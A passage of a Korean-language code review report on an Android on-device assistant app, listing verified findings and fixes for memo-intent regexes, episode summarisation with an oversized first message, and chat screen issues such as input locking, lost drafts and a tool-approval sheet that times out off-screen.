  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/memory/RepeatRequest.kt:15-21 — SAVE 는 기억해·저장·메모해·잊지 마·적어 둬/놔/줘 뿐
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/memory/MemoSaveIntent.kt:15 — 같은 목적의 SAVE_WORD_KO 는 까먹·외워·알아 둬·챙겨·기록해·잊으면 안 까지 포함(영어 쪽도 memo·jot down 등이 더 넓다)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/test/java/com/kosmos/app/domain/memory/RepeatRequestTest.kt:18 — "송장번호 다시 알려줄 테니 기억해 둬"는 되묻기가 아니어야 한다는 의도를 고정
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/agent/ToolCallGuards.kt:56-58 — RepeatRequest 가 메모 가드보다 먼저 판정
- 검증: 직접 확인: RepeatRequest.kt:15-18 SAVE 는 `기억해|저장|메모해|잊지\s*마|적어\s*(둬|놔|줘)`, MemoSaveIntent.kt:15 SAVE_WORD_KO 는 `기억|저장|메모|잊지 마|잊으면 안|까먹|적어(둬|두|놔|줘|주)|기록(해|좀)|외워|알아(둬|두|놔)|챙겨`. ToolCallGuards.kt:56-58 에서 RepeatRequest 가 메모 가드(61줄)보다 먼저 판정하므로 "비밀번호 다시 알려줄게, 외워둬"는 REPEAT("다시 알려")에 걸리고 SAVE 에는 안 걸려 add_memory 가 REPEAT_NOT_SAVE 로 막힌다. "다시 말해줄게 까먹지 마"도 같다("잊지 마"만 있고 "까먹" 없음). RepeatRequestTest.kt:18 은 "…다시 알려줄 테니 기억해 둬"·"잊지 마, 다시 말해 줄게"가 되묻기가 아니어야 한다는 의도를 이미 고정한다 — 같은 의도의 다른 낱말만 빠진 것. 회귀 세트 흉내도 두 목록을 따로 들고 있다(run.py:149-159 REPEAT_SAVE / SAVE_WORD_KO). 말투 조합이 드물어 심각도는 낮음. 통일할 때 제안의 주의가 맞다: hasSaveWord 는 "기억" 한 낱말로도 참이라 "뭐였지? 기억나?"가 저장 부탁으로 넘어간다 — 지금 SAVE 가 "기억해"로 좁힌 이유이므로 그 예외를 유지하는 단언을 추가해야 한다. 판정식 변경이라 run.py 와 repeat 문항 재실행.
- 앞선 기록: CHANGELOG 0.38.7 M5·exp61(RepeatRequest 도입) · 0.38.9(docs/CHANGELOG.md:648-654, 저장 낱말 넓히기) · 0.39.2 M4·0.41.7 M5(MemoSaveIntent 확장) — 두 목록의 차이는 기록 없음

### domain-10 · 첫 메시지 하나가 입력 상한을 넘으면 요약·사실 추출이 빈 대화를 모델에 보낸다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 긴 글을 붙여 넣고 "이거 정리해줘"로 시작한 대화는 그 에피소드의 요약 재료가 비게 된다. 모델은 내용 없는 입력으로 제목·태그·요약을 지어내고(형식만 맞으면 성공 처리), 사실 추출도 같은 빈 입력으로 돈다 — 지어낸 요약이 기억 검색과 주간 회고에 섞인다. 자주 생기는 경로는 아니지만 조용히 틀린 기억을 만드는 종류다. 그 긴 메시지가 채팅 단계에서 따로 잘리는지는 :app 쪽이라 확인하지 못했다.
- 제안: buildEpisodeTranscript 에서 한 메시지가 남은 예산을 넘으면 break 대신 그 메시지를 글자 단위로 줄여(절반씩 줄이는 방식) 앞부분만 넣고 다음 메시지로 계속 가거나, 최소한 결과가 비면 두 유스케이스가 추론 없이 Failure 를 돌려주게 한다. 한 메시지가 상한을 넘는 테스트를 추가한다. 요약·추출 프롬프트 문구는 바뀌지 않는다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/usecase/EpisodeTranscript.kt:27-38 — 메시지를 통째로만 넣고, 넘치는 첫 메시지에서 바로 break → 빈 문자열 반환. 뒤의 짧은 메시지들도 함께 버려진다
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/usecase/SummarizeEpisodeUseCase.kt:53-58,138 · ExtractFactsUseCase.kt:58-63,200 — 상한은 MAX_CONTEXT_TOKENS-300(=2,500토큰), 빈 전사여도 "다음 대화를 요약하세요." 뒤에 그대로 붙여 추론
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/core/src/main/java/com/kosmos/app/core/common/Constants.kt:211 — 채팅 입력은 8,192자까지 허용(한국어면 2,500토큰을 넘을 수 있다)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/test/java/com/kosmos/app/domain/SummarizeEpisodeUseCaseTest.kt:132-142 — 여러 메시지 합이 넘는 경우만 테스트, 한 메시지가 넘는 경우는 없다
- 검증: 직접 확인: EpisodeTranscript.kt:27-38 — 메시지를 통째로 붙여 보고 넘으면 break(35줄), 첫 메시지에서 넘으면 lines 가 비어 빈 문자열을 돌려준다. SummarizeEpisodeUseCase.kt:47-49 는 messages 가 비었을 때만 실패시키고 53-58줄에서 빈 전사를 "다음 대화를 요약하세요.\n\n" 뒤에 붙여 그대로 추론한다. ExtractFactsUseCase.kt:52-63 도 같다. 상한은 MAX_CONTEXT_TOKENS(Constants.kt:58, 2800)-300 = 2,500토큰(Summarize 138줄·Extract 200줄), 채팅 입력은 8,192자까지 허용(Constants.kt:211, SendChatMessageUseCase.kt:64). 한국어는 글자당 토큰이 많아(0.42.4 기록: 700자가 618토큰, CHANGELOG:141) 약 3천 자를 넘는 한 메시지면 2,500토큰을 넘을 수 있다 — 긴 글 붙여 넣기로 시작한 대화에서 성립. 요약은 형식만 맞으면 성공 처리(63-73줄)라 내용 없는 입력으로 만든 제목·요약이 기억에 들어갈 수 있다. 테스트 SummarizeEpisodeUseCaseTest 는 합이 넘는 경우만 다룬다. 빈도가 낮아 심각도는 낮음. 가장 작은 수정은 전사가 비면 추론 없이 Failure(요약은 재시도 계상에 들어가므로 무한 재시도가 되지 않는지 스케줄러의 재시도 상한을 같이 확인) 또는 넘치는 메시지의 앞부분만 잘라 넣기 — 뒤쪽이 KDoc 의 '앞쪽 보존' 방침과 맞는다. 프롬프트 문구는 안 바뀐다.
- 앞선 기록: EpisodeTranscript.kt:14-16 KDoc — '상한을 넘으면 앞쪽을 보존한다' 방침만. 첫 메시지 단독 초과는 CHANGELOG·architecture 에 없음(grep 0건)

<details><summary>읽은 범위</summary>

읽은 것(직접 통독): util/IsoDateTimeParser·KoreanHolidays, agent/ 전부(ScheduleTimeIntent·ScheduleWeekdayIntent·SchedulePastIntent·RefusalTurns·RejectionReplies·RepeatedQuestions·IdleGapHistory·ToolKvBudget), memory/RepeatRequest·MemoSaveIntent·RecallConflict·KnowledgeAutoSaveFilter·CurrentConversationLines·MemorySemantic, search/BigramMatcher, usecase/ 의 GetTodaySchedule·AddSchedule·AddReminder·GenerateBriefing·SendChatMessage·SummarizeEpisode·ExtractFacts·EpisodeTranscript·TranscribeAudio·SaveKnowledge, cleanup/ 전부, audit/ 전부, input/InputActivity, modelrunner/ChatPrompt·OneShotLimits(BrokenOutput)·ModelTurn, library/LibrarySearch. 대조용으로 :app 의 ToolCallGuards·BaseAgent 일부·AddScheduleToolExecutor·ToolArguments·AssistantOrchestrator 일부와 domain 테스트 5개(ScheduleTimeIntent·SchedulePastIntent·ScheduleWeekdayIntent·IsoDateTimeParser·SummarizeEpisode), CHANGELOG 0.42.4·0.42.5·0.42.7·0.41.13 항목, 0.41.13 계획서를 봤다.

못 읽었거나 훑기만 한 것: document/ 12개 파일(Xlsx·Docx·Hwpx·Csv 읽기 — XML 외부 엔티티 차단 설정이 있는 것만 grep 으로 확인), library/LibrarySemantic·LibraryChunker·LibraryRepository, 리포지토리 인터페이스들, model/ 데이터 클래스, tool/ 인터페이스, 나머지 테스트 35개. 토큰 예산 불변식(TokenBudgetInvariantTest)은 :app·:core 쪽이라 값만 확인했다. gradle·테스트·실험은 규칙대로 돌리지 않았으므로 모든 항목은 코드 읽기 기반이며, 모델이 실제로 어떤 start_time 을 내는지에 기대는 항목(domain-2·5)은 confidence 를 낮췄다.

레이어 위반: domain/src/main 에 android·androidx import 없음(grep 0건), build.gradle.kts 도 순수 kotlin("jvm") — 문제 없음.

10건을 넘겨 뺀 것(6건, 영향이 작거나 취향에 가까워서):
1) KoreanHolidays.coveredYears(2026..2027)가 main·test 어디서도 쓰이지 않아 2028년에 음력 공휴일이 조용히 사라진다 — 아직 13개월 남았고 KDoc 에 '매년 갱신'이 적혀 있음.
2) InputActivity.awaitQuiet 가 KDoc 의 'now 를 인자로' 설명과 달리 System.currentTimeMillis() 를 직접 읽는다(InputActivity.kt:39) — 판정 함수 quietRemainingMs 는 인자를 받으므로 영향 작음.
3) MemoSaveIntent 한국어는 \"기억\" 한 낱말로 저장 부탁을 인정해 \"비밀번호 기억나?\" 같은 물음도 통과(영어는 조회 물음 제외) — 놓쳐도 승인 시트가 뜰 뿐이라는 기록된 방침(넓게 잡는다)과 겹침.
4) humanizeStreaming 의 꼬리 정규식이 \"1588-1234\" 같은 네 자리-숫자 꼴을 스트리밍 중 잠깐 숨김 — 최종 답에서는 복구되는 깜빡임.
5) ApplyEpisodeMergeUseCase 가 3개 이상 묶음에서 중간 mergeInto 실패 시 일부만 합쳐진 상태로 남고, getByEpisode 실패를 빈 목록으로 삼켜 요약 재료가 줄 수 있음 — DB 실패가 전제라 가능성 낮음.
6) MemoryMergeGuard.toMemoEnding 의 ㅂ 받침 규칙이 규칙 활용(입다·잡다·좁다)을 \"이움\"처럼 잘못 바꿈, RepeatedQuestions 의 겹침 비율이 짧은 질문(\"언제야?\")에서 다른 주제 질문까지 같은 질문으로 볼 수 있음 — 표기·드문 경우.

</details>

## 채팅 화면 (chatui)

### chatui-1 · 시작 단계 입력 잠금이 입력바에만 걸려 있어 답 칩·첫 화면 예시·위젯 음성 진입은 그대로 통과한다 (녹음은 시작되는데 멈춤 버튼은 잠김)
- 판정 일부만 맞음 · 중요도 중간 · 크기 M
- 왜: 0.41.7 에서 엔진을 다시 올리거나 시작 단계(요약·브리핑·대화 준비)가 도는 동안 입력을 잠근 이유는 그 사이 요청이 GPU 를 다투어 화면이 멈췄기 때문이다. 그런데 잠금이 입력바 컴포저블 안의 지역 값이라 다른 진입로는 그대로 열려 있다. 실사용에서 가장 걸릴 경로는 위젯 마이크다: 앱이 백그라운드에서 돌아오면 엔진을 다시 올리는 중(시작 단계 진행)인데 녹음은 즉시 시작되고, 녹음 중지 버튼은 잠겨서 말을 끝내도 멈출 수 없다(시작 단계가 끝나거나 30초 상한까지 기다려야 함). 또 마지막 답의 칩이나 첫 화면 예시를 누르면 잠금 중에도 턴이 나간다. 녹음 중에 칩을 누르면 정지 버튼이 '응답 중단'으로 바뀌어 녹음을 끌 방법이 없고 녹음분이 조용히 사라질 수 있다. 위젯 진입과 시작 단계의 정확한 선후는 코드로만 추정했고 기기에서 확인하지 않았다.
- 제안: 잠금 판단을 한 곳으로 올린다. ChatUiState 에 '지금 보낼 수 있는가'(답 생성 중 아님 + 시작 단계 안 돎 + 녹음 중 아님)를 계산 속성으로 두고, sendMessage·toggleRecording(시작 쪽)·칩 표시 조건·EmptyChat 예시·위젯 음성 진입이 모두 그 값을 본다. 녹음 중지 버튼은 녹음 중이면 잠금과 무관하게 항상 누를 수 있게 한다(enabled = !locked || isRecording). 위젯 음성 진입은 잠금 중이면 버리지 말고 잠금이 풀릴 때 시작하도록 pendingVoiceStart 를 유지한다. ViewModel 단위 테스트로 '시작 단계 중 sendMessage 는 무시', '녹음 중 칩 전송 무시'를 고정하고, 위젯 마이크 → 복귀 직후 녹음은 에뮬레이터로 재현 확인.
- 근거:
  - app/src/main/java/com/kosmos/app/feature/chat/ChatInputBar.kt:88 — locked = isLoading || preparingHint != null (잠금 판단이 입력바 안에만 있음)
  - app/src/main/java/com/kosmos/app/feature/chat/ChatInputBar.kt:280 — 마이크/녹음 중지 버튼이 clickable(enabled = !locked) — 녹음 중이어도 시작 단계가 돌면 누를 수 없음
  - app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:441 — sendMessage 의 관문은 isInFlight 하나뿐(시작 단계·녹음 중 여부를 안 봄)
  - app/src/main/java/com/kosmos/app/feature/chat/ChatScreen.kt:413 — 답 칩 표시 조건이 !isInFlight && streamingText == null 뿐, :435 칩을 누르면 viewModel.sendMessage
  - app/src/main/java/com/kosmos/app/feature/chat/ChatScreen.kt:505 — EmptyChat(onStarter = viewModel::sendMessage) 도 잠금과 무관
  - app/src/main/java/com/kosmos/app/feature/chat/ChatScreen.kt:346-350 — 위젯·빠른 설정 타일 음성 진입은 isRecording/isInFlight 만 보고 바로 startVoice()
  - app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:676-693 — 녹음이 30초 상한으로 끝나면 sendMessage 호출, 그때 답 생성 중이면 :441 에서 말없이 버려짐(파일도 남음)
- 검증: 맞는 부분(직접 확인): ChatInputBar.kt:88 `locked = isLoading || preparingHint != null` 은 입력바 지역 값이고, :280 마이크/녹음 중지 버튼이 `clickable(enabled = !locked)` 라 녹음 중(isRecording)이어도 시작 단계 문구가 있으면 눌리지 않는다(:217-222 에서 녹음 중이면 MIC 동작이 선택됨). ChatScreen.kt:346-350 위젯 음성 진입은 isRecording/isInFlight 만 보고 startVoice() → ChatViewModel.kt:654-673 toggleRecording 도 시작 단계를 안 본다. 따라서 '복귀 직후 위젯 마이크 → 녹음 시작 → 중지 버튼 잠김'은 코드상 성립한다(기기 미확인). 또 ChatScreen.kt:413 칩 조건은 녹음 여부를 안 봐서 녹음 중 칩을 누르면 sendMessage(:441 관문은 isInFlight 뿐) → 버튼이 STOP 으로 바뀌고, 30초 타이머(:666-669)가 stopRecordingAndSend → sendMessage 를 부를 때 답 생성 중이면 :441 에서 조용히 버려진다(녹음 파일도 남음). 이것도 성립.
과장된 부분: '잠금 중에 칩·첫 화면 예시로 턴이 나간다'는 사실이지만 결함으로 보기 어렵다 — 0.41.7 설계가 시작 단계 중 요청을 허용한다(StartupCoordinator.kt:43 '그 사이 사용자가 요청을 보내면 남은 단계를 건너뛴다', CHANGELOG 0.41.7 M2 같은 문장). 잠금의 목적은 타이핑 중 버벅임이었고 칩 한 번 탭은 그 문제와 다르다. 첫 화면 예시(ChatScreen.kt:505)는 첫 실행 때 스플래시가 단계가 끝날 때까지 덮으므로 복귀 경로에서만 해당. 고칠 핵심은 두 가지로 좁히면 된다: ① 녹음 중이면 중지 버튼은 항상 활성(enabled = !locked || isRecording), ② 녹음 중에는 칩·예시 전송을 막거나 sendMessage 가 isRecording 을 본다. 위젯 진입을 잠금이 풀릴 때까지 미루는 것은 선택 사항.
- 앞선 기록: CHANGELOG 0.41.7 M2(복귀 중 입력 잠금 — '그 사이 요청을 보내면 남은 단계를 건너뛴다'), StartupCoordinator.kt:43 KDoc, CHANGELOG 0.40.2 M3-9(녹음 중 입력란 잠금). 칩·예시·위젯 경로를 일부러 열어 뒀다는 기록은 없음

### chatui-2 · 쓰던 글과 읽던 위치가 다른 화면에 다녀오거나 화면이 다시 만들어지면 사라진다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 매일 쓰는 흐름에서 자주 생긴다: 메시지를 쓰다가 위 요약 줄을 눌러 일정을 확인하고 돌아오면 쓰던 글이 없다. 드로어로 메모·설정에 다녀와도, 화면을 돌려도, 메모리 부족으로 프로세스가 죽었다 살아나도(3.6GB 모델을 쓰는 앱이라 드물지 않다) 같다. 과거 대화를 올려 읽다가 결과 카드를 눌러 일정 화면에 다녀오면 읽던 자리 대신 맨 아래로 내려간다. 데이터 손실은 아니지만 '쓰던 것이 사라지는' 체감 결함이다.
- 제안: ① 입력 글을 rememberSaveable(stateSaver = TextFieldValue.Saver) 로 바꾼다(E2E 계약인 hasSetTextAction·"Send" 에 영향 없음). ② userScrolledAway 를 rememberSaveable 로 바꾸고, 화면 첫 진입에서는 자동 스크롤 효과가 돌지 않도록 '메시지 수·생성 상태가 실제로 바뀐 때만' 스크롤하게 한다(이전 값을 기억해 비교). ③ Robolectric 테스트: StateRestorationTester 로 입력 글 복원 1건. 프로세스 종료 복원은 에뮬레이터에서 '활동 유지 안 함' 옵션으로 확인.
- 근거:
  - app/src/main/java/com/kosmos/app/feature/chat/ChatInputBar.kt:87 — var textState by remember { mutableStateOf(TextFieldValue("")) } (rememberSaveable 아님)
  - app/src/main/java/com/kosmos/app/feature/chat/ChatInputBar.kt:90-95 — 공유로 들어온 글도 textState 에만 넣고 원본(sharedInput)은 바로 지움 → 같은 경로로 유실
  - app/src/main/java/com/kosmos/app/feature/chat/ChatScreen.kt:151 — userScrolledAway 가 remember 라 화면에 다시 들어오면 false
  - app/src/main/java/com/kosmos/app/feature/chat/ChatScreen.kt:160-166 — 화면 진입 때마다 이 효과가 한 번 돌아 animateScrollToItem(0) → 저장된 목록 위치를 덮어씀
  - app/src/main/java/com/kosmos/app/feature/chat/ChatScreen.kt:366 — 요약 줄을 누르면 할 일·일정 화면으로 이동(채팅이 컴포지션에서 빠짐)
  - app/src/main/AndroidManifest.xml:49 — configChanges 는 uiMode 뿐(회전·글자 크기·언어 변경은 Activity 재생성)
- 검증: ChatInputBar.kt:87 `var textState by remember { mutableStateOf(TextFieldValue("")) }` — rememberSaveable 아님. :90-95 공유 글도 textState 에 넣고 바로 onClearSharedInput(). 채팅은 NavHost 의 한 목적지(MainScreen.kt:64-67 navigate, :110 AppNavHost)라 드로어·요약 줄(ChatScreen.kt:366)로 다른 화면에 가면 컴포지션에서 빠져 remember 값이 사라진다. AndroidManifest.xml:49 configChanges 는 uiMode 뿐이고 screenOrientation 고정도 없어 회전·글자 크기 변경 때도 같다. 읽던 위치: ChatScreen.kt:140 rememberLazyListState 는 저장되지만 :151 userScrolledAway 가 remember(초기 false)이고 :160-166 LaunchedEffect 가 재진입 시 한 번 돌아 animateScrollToItem(0) 을 부르므로 복원된 위치가 바닥으로 덮인다. CHANGELOG·architecture·plans 에서 입력 글 보존 관련 기록·결정은 찾지 못함. 제안(rememberSaveable + TextFieldValue.Saver, 첫 진입에서 자동 스크롤 생략)은 E2E 계약("Send"·hasSetTextAction)에 영향 없음. 주의: 스크롤 효과를 '실제로 바뀐 때만'으로 고칠 때 0.38.2 의 '내가 막 보낸 턴이면 바닥으로'(:162) 동작을 유지해야 한다.

### chatui-3 · 문서를 붙여 보낸 직후에는 말풍선에 첨부 표시가 전혀 없고, 앱을 다시 열어야 '첨부 문서' 칩이 생긴다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 문서를 붙여 질문하면 미리보기가 사라지고 내 말풍선에는 글만 남아, 문서가 실제로 같이 갔는지 그 화면에서는 알 수 없다. 앱을 다시 열면 같은 대화에 칩 말풍선이 하나 더 생겨 화면이 달라진다(같은 대화가 두 가지 모양). 이미지 실패 때 '성공처럼 보이는 실패'를 막으려고 턴을 중단하게 고친 것(ChatViewModel:485 주석)과 같은 종류의 신뢰 문제다. 포트폴리오 시연에서 문서 질문은 눈에 띄는 기능이라 바로 보인다.
- 제안: 문서가 붙은 턴은 임시 사용자 메시지 뒤에 화면용 문서 블록 메시지를 하나 더 붙인다 — 내용은 AttachedDocumentBlock.wrap(문서 글, 현재 언어) 로 만들어 저장 형식과 바이트가 같게 한다(화면 표시만이라 모델 입력은 그대로). 또는 더 단순하게, 문서 턴이 끝나면 음성 턴처럼 loadMessages() 로 DB 내용으로 바꾼다(539줄 조건에 documentText != null 추가). 두 번째가 코드가 적고 저장된 것과 화면이 항상 같아진다. ViewModel 테스트 1건(문서 턴 뒤 목록에 문서 블록이 있다).
- 근거:
  - app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:450-466 — 문서는 documentText 로만 넘기고 화면용 임시 사용자 메시지는 content = text, inputType = TEXT 하나만 만듦(문서 첨부 표식 없음)
  - app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:454 — 보내는 즉시 clearSharedInput() 으로 입력바 위 미리보기도 사라짐
  - app/src/main/java/com/kosmos/app/assistant/orchestrator/AssistantOrchestrator.kt:118-127 — DB 에는 사용자 글과 별도의 문서 블록 행이 하나 더 저장됨(같은 시각)
  - app/src/main/java/com/kosmos/app/feature/chat/ChatBubbles.kt:101 — 저장된 문서 블록 행만 '첨부 문서 n자' 칩으로 그림
  - app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:539 — 턴 뒤 DB 재동기화는 음성 턴에만 함
- 검증: ChatViewModel.kt:450-452 문서는 documentText 로만 만들고 :454 clearSharedInput() 으로 미리보기를 지운 뒤 :456-465 임시 사용자 메시지는 content = text, inputType = TEXT 하나뿐이다. AssistantOrchestrator.kt:108 사용자 글 저장 뒤 :120-127 에서 AttachedDocumentBlock.wrap 한 문서 블록을 USER 행으로 하나 더 저장한다(같은 now). ChatBubbles.kt:101 `AttachedDocumentBlock.bodyOrNull(text)` 로 저장된 블록만 칩으로 그린다. ChatViewModel.kt:539 재동기화는 `audioFilePath != null` 일 때만, handleAgentResult(:589-636)도 비서 메시지만 덧붙인다. 그래서 문서 턴 직후 라이브 목록에는 문서 표시가 없고, 다음에 loadMessages 가 돌 때(앱 재시작·브리핑 저장 신호 :293·음성 턴)에야 칩 행이 나타난다 — 주장 그대로. 두 번째 안(539줄 조건에 documentText != null 추가)이 가장 작다. 참고: 사용자 글과 문서 블록이 같은 시각(now)으로 저장되므로 다시 읽을 때 두 행의 순서가 안정적인지는 정렬 기준을 한 번 확인할 것(이번에 확인하지 않음).
- 앞선 기록: CHANGELOG 0.36.0 D6(837줄 부근, 첨부 문서 말풍선을 접힌 칩으로 — 저장된 행 표시만 다룸). 보낸 직후 화면에 대한 기록 없음

### chatui-4 · 승인 시트가 채팅 화면 안에서만 그려져, 답을 기다리며 다른 화면에 가 있으면 보지도 못한 채 60초 뒤 자동 거절된다
- 판정 확인됨 · 중요도 중간 · 크기 M
- 왜: 기기 추론은 승인 요청이 뜰 때까지 수 초~십여 초 걸린다. 그 사이 일정 화면을 확인하러 가는 것은 자연스러운 행동인데("내일 3시에 회의 잡아줘" 후 달력 확인), 그러면 승인 시트가 어디에도 보이지 않고 60초 뒤 조용히 거절된다. 돌아와서 보이는 것은 '취소했어요'류의 답뿐이라 왜 저장이 안 됐는지 알기 어렵다. 실사용 단계에서 '저장했다고 생각했는데 없다'로 이어질 수 있다.
- 제안: 가장 싼 방법 두 가지 중 하나: ① 승인 요청이 생기면(ApprovalCoordinator.pendingRequest) 셸(AppNavHost 또는 MainScreen)이 현재 화면이 채팅이 아닐 때 채팅으로 되돌린다(popBackStack 이 아니라 AppNavHost.navigateBack 계열 사용, AGENTS 2-⑥). ② 승인 시트를 ChatScreen 의 overlay 처럼 셸 층으로 올려 어느 화면에서든 뜨게 한다(E2E 는 ChatScreen 단독 compose 라 시트 호출을 ChatScreen 에 남기고 셸에서는 채팅이 아닐 때만 추가로 그리는 식). 남은 시간 표시는 요청에 시작 시각을 실어(ApprovalRequest 또는 coordinator 가 노출) 다시 그려져도 실제 남은 시간부터 시작하게 한다.
- 근거:
  - app/src/main/java/com/kosmos/app/feature/chat/ChatScreen.kt:541-559 — ApprovalSheet 는 ChatScreen 본문에서만 호출
  - app/src/main/java/com/kosmos/app/ui/MainScreen.kt:37-40, 58-62 — 답 생성 중에도 드로어로 일정·메모·설정 화면 이동이 막혀 있지 않음(이동하면 채팅은 컴포지션에서 빠짐)
  - app/src/main/java/com/kosmos/app/feature/chat/ChatScreen.kt:366 — 요약 줄도 생성 중에 눌러 이동 가능
  - app/src/main/java/com/kosmos/app/assistant/approval/ApprovalCoordinator.kt:61, 103 — withTimeoutOrNull(60초) 뒤 거절 처리, 화면이 보이는지와 무관
  - app/src/main/java/com/kosmos/app/feature/approval/ApprovalSheet.kt:197 — 남은 시간 표시가 remember(timeoutKey) 라 화면 회전 등으로 다시 만들어지면 가득 찬 상태로 다시 시작(실제 남은 시간과 어긋남)
- 검증: ApprovalSheet( 호출부는 저장소 전체에서 ChatScreen.kt:545 한 곳뿐(grep 확인). 승인 요청 구독도 ChatViewModel.kt:390 뿐이고 AppNavHost·MainScreen·MainActivity 에는 pendingApproval/isInFlight 를 보는 코드가 없다 — 답 생성 중 드로어(MainScreen.kt:64-67)·요약 줄(ChatScreen.kt:366)로 이동이 막히지 않는다. ApprovalCoordinator.kt:61 withTimeoutOrNull(APPROVAL_TIMEOUT_MS=60초, :103) 뒤 거절, 화면 가시성과 무관. 60초 안에 돌아오면 pendingApproval 이 ViewModel 에 남아 시트는 다시 뜨지만 ApprovalSheet.kt:197-207 의 남은 시간 표시는 remember(timeoutKey) + 프레임 시계 시작점이라 가득 찬 상태에서 다시 시작해 실제 남은 시간과 어긋난다(확인). 한계 자체는 문서에 '전제'로 적혀 있으나 실사용에서 '저장한 줄 알았는데 없다'로 이어질 수 있어 실사용 단계 후보로 타당. 가장 싼 안은 ① 승인 요청이 생기면 채팅으로 되돌리기 — AGENTS 2-⑥ 에 따라 popBackStack 직접 노출 금지.
- 앞선 기록: docs/architecture.md:1907·docs/plans/0.24.0-auto-extract.md:17·CHANGELOG 1003줄 — 'ApprovalCoordinator 는 단일 슬롯·60초 자동 거절·채팅 화면 생존 전제'로 한계를 알고 있음(그래서 프로필 제안은 테이블에 영속). 툴 승인 쪽을 그대로 두기로 한 결정 기록은 없음

### chatui-5 · ChatViewModel 이 생성자 의존성 19개로 녹음·낭독·기기 상태 폴링·프로필 제안·기억 칩 라벨·페이징·전송을 모두 맡고 있다
- 판정 확인됨 · 중요도 낮음 · 크기 L
- 왜: 면접에서 '가장 큰 화면의 상태 관리를 설명해 보라'는 질문을 받으면 바로 드러나는 약점이다. 기능을 붙일 때마다 E2E 테스트의 생성부를 고쳐야 해서 이미 ChatExtrasViewModel·DocSourceViewModel·WebSearchViewModel 로 우회해 왔는데, 본체는 그대로 커졌다. chatui-1(잠금 판단이 흩어짐)·chatui-7(쓰지 않는 저장)도 책임이 섞인 데서 나온 증상이다. 문서 머리말을 ViewModel 이 만드는 것은 모델 입력 조립이 두 층에 나뉘어 있다는 뜻이기도 하다.
- 제안: 동작을 바꾸지 않는 순수 이동으로 세 덩어리를 떼어 낸다(각각 독립 마일스톤): ① 음성 입력 조정자(녹음 시작/중지·30초 타이머·낭독 멈춤) — ViewModel 은 결과 파일만 받아 sendMessage. ② 머리글 상태(엔진 상태·시작 단계·기기 상태 폴링·발열 경고)를 ChatExtrasViewModel 처럼 별도 ViewModel 로 — ChatScreen 은 기본값을 가진 인자로 받아 E2E 단독 compose 계약 유지. ③ 프로필 제안 구독·저장을 승인 쪽 ViewModel 로. 첨부 문서 머리말 조립은 문구를 그대로 둔 채 AssistantOrchestrator 쪽(AttachedDocumentBlock 옆)으로 옮긴다 — 글자가 한 자라도 바뀌면 모델 입력 변경이므로 PromptFixture 로 바이트 동일을 확인한다. 기존 테스트 단언은 그대로, 생성부만 수정.
- 근거:
  - app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:69-89 — 생성자 인자 19개(Context 포함)
  - app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:214-221 — init 에서 구독 8종 시작
  - app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:305-321 — 기기 상태 2초/5초 폴링 루프
  - app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:654-693 — 녹음 시작·상한 타이머·전송
  - app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:259-275 — 프로필 제안 저장과 안내 문구 조립
  - app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:447-452 — 모델에 들어갈 첨부 문서 머리말(한/영)을 화면 층 ViewModel 이 직접 조립
  - app/src/main/java/com/kosmos/app/feature/chat/result/ChatExtrasViewModel.kt:16-17(KDoc) — 'ChatViewModel 생성자를 늘리면 E2E 손 생성부를 모두 고쳐야 한다'가 새 ViewModel 을 따로 만든 이유로 적혀 있음
- 검증: ChatViewModel.kt:69-89 생성자 인자 19개(직접 셈: Context·SavedStateHandle 포함), :214-221 init 구독 8종, :305-321 기기 상태 폴링, :654-693 녹음·타이머, :259-275 프로필 제안 저장·문구, :447-452 모델에 들어갈 첨부 문서 머리말(한/영)을 ViewModel 이 조립 — 모두 확인. ChatExtrasViewModel.kt:46-47 KDoc 에 'ChatViewModel 생성자를 늘리면 E2E 손 생성부를 모두 고쳐야 한다'가 분리 이유로 적혀 있다. 사실 관계는 맞지만 동작 결함이 아니라 유지보수·설명 부담이고 파일은 750줄로 감당 가능한 크기라 severity 는 low 로 낮춘다. 주의: 손 생성부는 3곳이 아니라 5곳(ScreenCatalogTest:407, ChatSpeechIntegrationTest:133, MultimodalChatE2ETest:130, ToolApprovalE2ETest:164, VoiceChatIntegrationTest:119). 문서 머리말 조립을 옮기는 것은 글자가 바뀌면 모델 입력 변경이므로 PromptFixture 바이트 동일 확인이 필수 — 이 부분만은 touchesModelInput 위험이 있다고 표시하는 편이 안전하다. 실사용 단계가 먼저이므로 포트폴리오 정리 단계로 미뤄도 된다.
- 앞선 기록: docs/plans/0.40.2-bug-fixes.md:11·:215 — 'ChatViewModel 분리'는 0.41.0 이후로 미룸(이후 진행 기록 없음, 하지 않기로 한 결정도 없음)

### chatui-6 · 답이 흐르는 동안 토큰마다 화면 상태 전체가 바뀌어 채팅 화면 본문이 통째로 다시 실행된다 (말풍선 글만 50ms 로 묶여 있음)
- 판정 일부만 맞음 · 중요도 낮음 · 크기 M
